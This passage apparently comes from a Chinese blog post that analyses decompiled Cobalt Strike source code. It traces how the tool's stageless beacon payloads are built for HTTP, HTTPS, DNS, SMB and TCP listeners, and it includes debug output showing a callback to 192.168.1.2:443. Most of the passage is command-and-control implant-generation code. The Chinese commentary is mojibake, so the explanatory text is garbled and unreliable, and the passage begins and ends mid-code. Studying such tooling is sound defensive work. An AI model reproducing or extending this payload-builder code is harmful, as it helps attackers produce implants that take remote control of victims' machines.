class="token punctuation">,</span><span class="token string">"æµ‹è¯•æ˜¯å¦æ˜¯shellcodeç”Ÿæˆç‚¹.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ˜¯shelllcodeç›´æ¥ä¸Šçº¿æˆåŠŸ</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>dialog<span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Could not generate "</span> <span class="token operator">+</span> var4 <span class="token operator">+</span> <span class="token string">" payload for "</span> <span class="token operator">+</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var12 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token class-name">String</span> var13 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"PowerShell"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"ps1"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"Raw"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"bin"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"EXE"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"exe"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var12<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"DLL"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">getDefaultFileName</span><span class="token punctuation">(</span><span class="token string">"beacon"</span><span class="token punctuation">,</span> <span class="token string">"dll"</span><span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">SafeDialogs</span><span class="token punctuation">.</span><span class="token function">saveFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">JFrame</span><span class="token punctuation">)</span><span class="token keyword">null</span><span class="token punctuation">,</span> var13<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ç”±ä¸Šç¯‡çš„stageæˆ‘ä»¬çŸ¥é“ this.stager &#x3D; var8.export(this.client, var4, var6, var9, var10, var11); &#x2F;&#x2F;stageless ç”Ÿæˆå‡½æ•° shellcode ç”Ÿæˆç‚¹ ä¸ºshellcodeç”Ÿæˆç‚¹æˆ‘ä»¬å…ˆè¿›å…¥å‡½æ•°å†…éƒ¨çœ‹çœ‹å¹²äº†å•¥äº†</p><p>src&#x2F;common&#x2F;ScListener.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token class-name">AggressorClient</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var3<span class="token punctuation">,</span> <span class="token class-name">String</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">,</span> <span class="token class-name">String</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"shellcode ç”Ÿæˆç‚¹.............. "</span><span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BeaconDLL</span> var7 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬åœ¨è¿›å»this.Aå‡½æ•°çœ‹çœ‹ã€‚ä¸‹é¢ä»£ç æ ¹æ®ç›‘å¬å™¨ç”Ÿæˆpayload</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">BeaconDLL</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">,</span> <span class="token keyword">int</span> var2<span class="token punctuation">,</span> <span class="token class-name">AggressorClient</span> var3<span class="token punctuation">,</span> <span class="token class-name">String</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">,</span> <span class="token class-name">String</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless dll payload .........."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/foreign/reverse_http"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_getPayloadStager</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/foreign/reverse_https"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_getPayloadStager</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">BeaconPayload</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconPayload</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var6<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç”Ÿæˆ payload</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_http/reverse_http"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"listener windows/beacon_http/reverse_http"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBeaconStageHTTP</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_https/reverse_https"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBeaconStageHTTP</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_dns/reverse_dns_txt"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBeaconStageDNS</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCallbackHosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_bind_pipe"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isExternalC2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportExternalC2Stage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_bind_pipe"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportSMBStage</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_bind_tcp"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportBindTCPStage</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"windows/beacon_reverse_tcp"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var7<span class="token punctuation">.</span><span class="token function">exportReverseTCPStage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestFail</span><span class="token punctuation">(</span><span class="token string">"Unknown payload '"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BeaconDLL</span> var8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconDLL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>fileName <span class="token operator">=</span> <span class="token string">"unknown.beacon.dll"</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>originalDLL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>peProcessedDLL <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> var8<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬è¿™é‡Œçš„ç›‘å¬å™¨æ˜¯ listener windows&#x2F;beacon_https&#x2F;reverse_https æ‰€ä»¥è¿›å…¥åˆ°è¿™ä¸ªå‡½æ•°  var7.exportBeaconStageHTTP(this.getPort(), this.getCallbackHosts(), false, true, var4);<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241035767.png" alt="ä»£ç åˆ†ææ‰§è¡Œ"><br>src&#x2F;beacon&#x2F;BeaconPayload.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">BeaconDLL</span> <span class="token function">exportBeaconStageHTTP</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStageHTTP "</span><span class="token operator">+</span>var2<span class="token operator">+</span><span class="token string">" | "</span><span class="token operator">+</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AssertUtils<span class="token punctuation">.</span>TestSetValue</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">,</span> <span class="token string">"x86, x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var6 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/winhttpb.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/winhttpb.x64.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/beacon.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> <span class="token string">"resources/beacon.x64.dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var7 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>C</span><span class="token punctuation">(</span><span class="token string">"HTTP"</span><span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//var5åœ¨ httpè¯·æ±‚ä¸­ä¸ºç©º</span>var7 <span class="token operator">=</span> var7 <span class="token operator">+</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStageHTTP :| "</span> <span class="token operator">+</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStageHTTP loadDll: "</span> <span class="token operator">+</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">BeaconDLL</span> var8 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeaconDLL</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>originalDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportBeaconStage</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span>var8<span class="token punctuation">.</span>peProcessedDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pe<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>var8<span class="token punctuation">.</span>originalDLL<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span><span class="token function">setCustomLoaderSize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listener<span class="token punctuation">.</span><span class="token function">getCustomLoaderSizeKB</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var8<span class="token punctuation">.</span><span class="token function">usesCustomLoaderSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/winhttpb"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/winhttpb.x64"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x86"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/beacon"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"x64"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>arch<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var8<span class="token punctuation">.</span>customFileName <span class="token operator">=</span> <span class="token string">"resources/beacon.x64"</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getCustomLoaderExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".dll"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var8<span class="token punctuation">.</span>customDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportBeaconStage</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var8<span class="token punctuation">.</span>customFileName<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> var8<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æŠŠä¸Šé¢çš„ä½æ•°å’Œsystem callè°ƒç”¨æ–¹å¼ä¼ å…¥ </p><pre class="language-java" data-language="java"><code class="language-java">var8<span class="token punctuation">.</span>originalDLL <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">exportBeaconStage</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>useWinHTTP<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ‰§è¡Œç»“æœå¦‚ä¸‹:<br>listener windows&#x2F;beacon_https&#x2F;reverse_https<br/><br>stageless exportBeaconStageHTTP 192.168.1.2 |<br>stageless exportBeaconStageHTTP :| Generating Payload: test â€“ Type: HTTP â€“ Arch: x64 â€“ Exit Function: Process â€“ System <br/>Call: Indirect â€“ HTTP Library: wininet<br/><br>stageless exportBeaconStageHTTP loadDll: resources&#x2F;beacon.x64.dll<br/><br>stageless exportBeaconStage: 443  |192.168.1.2  |false  |true  |resources&#x2F;beacon.x64.dll  |              |false  |<br/></p><p>src&#x2F;beacon&#x2F;BeaconPayload.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">exportBeaconStage</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var3<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var4<span class="token punctuation">,</span> <span class="token class-name">String</span> var5<span class="token punctuation">,</span> <span class="token class-name">String</span> var6<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless exportBeaconStage: "</span> <span class="token operator">+</span>var1<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var2<span class="token operator">+</span><span class="token string">" |"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token 